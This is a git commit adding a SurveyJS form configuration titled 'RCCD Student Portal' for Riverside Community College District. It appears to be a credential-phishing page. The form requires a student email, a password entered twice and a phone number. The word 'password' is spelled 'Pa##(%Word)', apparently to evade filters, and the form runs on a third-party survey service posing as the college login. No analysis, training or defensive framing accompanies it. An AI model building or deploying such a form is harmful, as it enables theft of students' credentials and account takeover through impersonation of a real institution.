50f0b1f250e13d770191c4f437cc2d65eef66371
Riverside-CommunityCol <salamilla2@student.rccd.edu>
2026-02-06 23:35:21 -0500

    Add files via upload

---
+++ JSON.js
@@ -0,0 +1,45 @@
+const json = {
+  "title": "RIVERSIDE COMMUNITY COLLEGE DISTRICT",
+  "logo": "https://api.surveyjs.io/private/Surveys/files?name=ae5543c6-614e-4608-a8c6-3c8e4b5b5da6",
+  "pages": [
+    {
+      "name": "RCCD",
+      "title": "RCCD Student Portal",
+      "elements": [
+        {
+          "type": "text",
+          "name": "question1",
+          "title": "Student Email",
+          "isRequired": true
+        },
+        {
+          "type": "text",
+          "name": "question2",
+          "title": "Pa##(%Word)",
+          "isRequired": true
+        },
+        {
+          "type": "text",
+          "name": "question3",
+          "title": "Reconfirm Pa##(%Word) ",
+          "isRequired": true
+        },
+        {
+          "type": "text",
+          "name": "question4",
+          "title": "Phone Number ",
+          "isRequired": true
+        }
+      ]
+    }
+  ],
+  "showNavigationButtons": false,
+  "showPrevButton": false,
+  "showPageTitles": false,
+  "autoAdvanceEnabled": true,
+  "allowResizeComment": false,
+  "pageNextText": "Enter",
+  "questionsOnPageMode": "questionPerPage",
+  "gridLayoutEnabled": true,
+  "headerView": "advanced"
+}
